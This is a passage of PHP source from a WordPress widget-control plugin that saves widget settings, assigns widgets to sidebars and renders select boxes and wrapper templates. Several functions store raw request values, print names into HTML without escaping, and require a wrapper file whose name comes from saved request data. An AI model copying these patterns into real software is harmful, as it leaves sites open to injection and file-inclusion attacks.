	if (array_key_exists('twcp_default_sidebar', $_REQUEST))
		$fields['twcp_default_sidebar'] = $_REQUEST['twcp_default_sidebar'];
	
	if (array_key_exists('twcp_exclude_sidebar', $_REQUEST))
		$fields['twcp_exclude_sidebar'] = $_REQUEST['twcp_exclude_sidebar'];
	
	if (array_key_exists('twcp_inherit_sidebar', $_REQUEST))
		$fields['twcp_inherit_sidebar'] = $_REQUEST['twcp_inherit_sidebar'];
	
	if (array_key_exists('twcp_wrapper_file', $_REQUEST))
		$fields['twcp_wrapper_file'] = $_REQUEST['twcp_wrapper_file'];
	
	if (array_key_exists('twcp_widget_title', $_REQUEST))
		$fields['twcp_widget_title'] = $_REQUEST['twcp_widget_title'];
	
	if (array_key_exists('twcp_status', $_REQUEST))
		$fields['twcp_status'] = $_REQUEST['twcp_status'];
	
	if (array_key_exists('twcp_visibility', $_REQUEST))
		$fields['twcp_visibility'] = $_REQUEST['twcp_visibility'];
	
	if (array_key_exists('twcp_publish_time', $_REQUEST))
		$fields['twcp_publish_time'] = $_REQUEST['twcp_publish_time'];
	
	if (array_key_exists('twcp_visible_parent', $_REQUEST))
		$fields['twcp_visible_parent'] = $_REQUEST['twcp_visible_parent'];
	
	return $fields;
}

/**
 * Function appends the menu item data to the instance fields
 * 
 * @TODO Need to also save the object type
 * @param array $fields
 * @return array $fields
 */
function twc_save_menu_items( $fields )
{
	//reasons to fail
	if (!array_key_exists('menu-item', $_REQUEST)) return $fields;
	
	//initializing variables
	$object_ids = array();
	$menu_item_urls = array();
	
	foreach ((array)$_REQUEST['menu-item'] as $item) 
		foreach ((array)$item as $menu_item => $id)
		{
			//saving the menu item url
			if ($menu_item == 'menu-item-url')
			{
				$menu_item_urls[$id] = $id;
			}
			
			//saving the object ID
			if ($menu_item == 'menu-item-object-id') 
			{
				$object_ids[$id] = $id;
			}
		}
	
	$fields['menu_item_object_id'] = $object_ids;
	$fields['menu_item_urls'] = $menu_item_urls;
	return $fields;
}

/**
 * Function accepts the widget id and the sidebar and saves the 
 * relationship.
 *
 * @param string $widget_id
 * @param string $sidebar_id
 */
function twc_save_widget_sidebar( $widget_id, $sidebar_id, $position = 0, $delete = false )
{
	if (!$widget_id || !current_user_can('activate_plugins'))
		return false;
	
	//initializing variables
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	// remove old position
	foreach ( $sidebars_widgets as $key => $sb )
	{
		$sidebars_widgets[$key] = array_diff( (array)$sb, array($widget_id) );
	}
	
	array_splice( $sidebars_widgets[$sidebar_id], $position, 0, $widget_id );
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * This function accepts fields for a given widget and saves those fields to the db.
 *
 * @param string $widget_id
 * @param array $fields
 */

function twc_save_widget_fields( $widget_id, $post )
{
	//initializing variables
	if (!$widget_id || !current_user_can('activate_plugins'))
	{
		wp_redirect(get_bloginfo('url').'/wp-admin/widgets.php?message=0');
		exit;
	}
	
	//initializing variables
	global $wp_registered_widget_updates;
	$fields = $post;
	$_POST = array();
	$widget = twc_get_widget_by_id($widget_id);
	$id_base = _get_widget_id_base($widget['id']);
	$ignore = array('sidebar_slug','id_base','widget-width','widget-height',
	'widget_number','multi_number','action','redirect','editwidget','addnew','base','num',
	'view');
	
	
	if ($widget['multiwidget'])
	{
		//variable as constructed by wordpress
		if (isset($post['widget-'.$id_base])
		&& isset($post['widget-'.$id_base][$widget['number']]))
		{
			$fields = $post['widget-'.$id_base][$widget['number']];
		}
	}
	
	//filtering the fields
	foreach ($fields as $key => $value)
	{
		if (in_array($key, (array)$ignore))
		{
			unset($fields[$key]);
		}
	}
	

	if ($widget['multiwidget'])
	{
		$_POST['widget-'.$id_base][$widget['number']] = apply_filters('twc-save-widget-fields', $fields);
		$_POST['multi_number'] = $widget['number'];
	}
	else
	{
		$_POST = apply_filters('twc-save-widget-fields', $fields);
		
		//take the data handling into our own hands if this is not a multiwidget
		$singles = get_option('twc_single_widget_data', array());
		$singles[$widget['id']] = $_POST;
		update_option('twc_single_widget_data', $singles);
	}
	
	//this calls the widgets update function with the given params
	foreach ( (array) $wp_registered_widget_updates as $name => $control )
	{
		if ( $name != $id_base || !is_callable($control['callback']) )
			continue;
	
		ob_start();
			call_user_func_array( $control['callback'], $control['params'] );
		ob_get_clean();
		break;
	}
	return true;
}

/**
 * 
 *
 * @return unknown
 */
function twc_search_list_for()
{
	if (!isset($_REQUEST['twcp_search_input']) || empty($_REQUEST['twcp_search_input'])) return false;
	$_REQUEST['inactive'] = 'active';
	
	return $_REQUEST['twcp_search_input'];
}

/**
 * function is responsible for setting the current url
 *
 */
function twc_set_object_url()
{
	//initializing variables
	global $twc_menu_item_url;
	
	//reasons to fail
	if (isset($twc_menu_item_url)) return $twc_menu_item_url;
	$twc_menu_item_url = f20_get_page_url();
	return $twc_menu_item_url;
}

/**
 * Save the original object id
 * 
 * @return string $twc_menu_item_object_id
 */
function twc_set_object_id()
{
	//initializing variables
	global $wp_query;
	static $twc_menu_item_object_id;
	
	//reasons to fail
	if (isset($twc_menu_item_object_id)) return $twc_menu_item_object_id;
	
	if (!isset($wp_query))
	{
		wp_reset_query();
	}
	
	if (!$wp_query->have_posts())
	{
		//this is used for the admin area
		if (isset($_REQUEST['post']) && $post = get_post($_REQUEST['post']))
		{
			if ($post->post_type == 'page')
			{
				$query = array('page_id' => $post->ID);
			}
			else
			{
				$query = array('p' => $post->ID, 'post_type' => 'any');
			}
		}
		$wp_query->query($query);
	}
	
	//now that the wp_query is setup, we get the object id
	$wp_query->get_queried_object();
	$twc_menu_item_object_id = $wp_query->queried_object_id;
	return $twc_menu_item_object_id;
}

/**
 * function shows debug info
 * 
 * @return unknown
 */
function twc_show_object_id()
{
	//initializing varaibles
	$debug_locations = (isset($_REQUEST['twc_debug']));
	
	//reasons to fail
	if ( TWC_CURRENT_USER_CANNOT ) return false;
	if (!$debug_locations) return false;
	echo '<div style="position:absolute;top:0px;left:0px;background:#fff;padding:5px;">'.twc_get_object_id().'</div>';
}

/**
 * Just prints a sidebar
 *
 * @param unknown_type $default
 * @return unknown
 */
function twc_sidebar_select_box( $default = 'wp_inactive_widgets', $widget = null, $format = false, $name = null )
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$select_filter = '';
	
	if (!is_null($name))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
	}
	elseif ($format)
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'sidebar';
	}
	elseif (!is_null($widget))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'widget-'.$widget['id_base'].'['.$widget['number'].'][sidebar_slug]';
	}
	
	$select = '<select id="'.$id.'" name="'.$name.'" class="twc_sidebar_select_box">'.$select_filter;
	
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * Just prints a filter sidebar
 * 
 * @return unknown
 */
function twc_sidebar_filter_box()
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$default = twc_filter_list_for();
	
	$select = '<select name="twcp_filter" class="twc_sidebar_filter_box">'
			. '<option value="">  -  '.__('Remove Filter','twc').'  -  </option>';
		
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * function is responsible for putting the widget back together.
 * This function also keeps track of the widget loop within the dynamic_sidebar.
 * Once the dynamic_sidebar function is completed, we declare a do_action to
 * activate our own sidebar function.
 *
 * @param unknown_type $widget
 */
function twc_trigger_sidebar( $widget_shell )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets;
	static $keeping_count;
	$debug_locations = (isset($_REQUEST['twc_debug']));
	$sidebar_id = twc_get_widgets_sidebar($widget_shell['id']);
	$count = twc_count_sidebar_widgets($sidebar_id);
	
	if (!isset($keeping_count))
	{
		$keeping_count = 0;
	}
	$keeping_count++;
	
	if ($count == $keeping_count)
	{
		//ensures that we have a well formed widget variable before calling our sidebar
		$wp_registered_widgets = $twc_wp_registered_widgets;
		if ($debug_locations) echo '<div style="border: 1px dashed pink;min-height:25px;"><b>'.$sidebar_id.'</b>';
		do_action('twc_dynamic_sidebar', $sidebar_id);
		if ($debug_locations) echo '</div>';
		
		$keeping_count = 0;
	}
	
}

/**
 * Button encourages the user to upgrade to pro
 *
 */
function twc_upgrade_button()
{
	if (function_exists('twc_widget_protitle')) return;
	echo '<a class="twc_upgrade_button button-primary" href="'.get_bloginfo('url').'/wp-admin/widgets.php?action=register&license=1">'.__('Upgrade to Pro $9','twc').'</a>';
}

/**
 * This function adds the view switches to the wordpress widget page
 *
 * @return unknown
 */
function twc_view_switch()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasons to fail
	if ((!$GLOBALS['TWCAUTH']) && (twc_list_style_twc() 
	|| $current_screen->parent_base != 'widgets')) return false;
	
	echo '<div>'.twc_get_show_view('twc-view-switch').'</div>';
	
}

/**
 * Function sets the global $widget variable
 *
 * @return null
 */
function twc_widget_global()
{
	//initializingn variables
	global $widget;
	$widget_id = (isset($_REQUEST['widget_id']))? $_REQUEST['widget_id']: ((isset($_REQUEST['widget-id']))? $_REQUEST['widget-id'] : ((isset($_REQUEST['editwidget']))? $_REQUEST['editwidget']: false));
	
	//loading resources
	$widget = twc_get_widget_by_id( $widget_id );
	
	//reasons to return
	if (!$widget) return;
	
}

/**
 * Function returns the widgets grouped by sidebar
 *
 * @return unknown
 */
function twc_wp_get_sidebars_widgets()
{
	$sidebars_widgets = wp_get_sidebars_widgets();
	if ( empty( $sidebars_widgets ) )
		$sidebars_widgets = wp_get_widget_defaults();
	
	return $sidebars_widgets;
}

/**
 * wraps the widget display
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twcp_widget_wrapper( $display, $widget )
{
	//initializing variables
	$path = TwcPath::clean(get_theme_path().'/widget-wrappers/');
	$hasWrapper = (isset($widget['p']['twcp_wrapper_file']) && $widget['p']['twcp_wrapper_file']);
	$wrapper = twc_find(array($path), @$widget['p']['twcp_wrapper_file']);
	
	//reasons to return
	if (!$hasWrapper || !$wrapper || !is_file($wrapper) || !file_exists($wrapper)) 
		return $display;
	
	ob_start();
	require $wrapper;
	return ob_get_clean();
}	



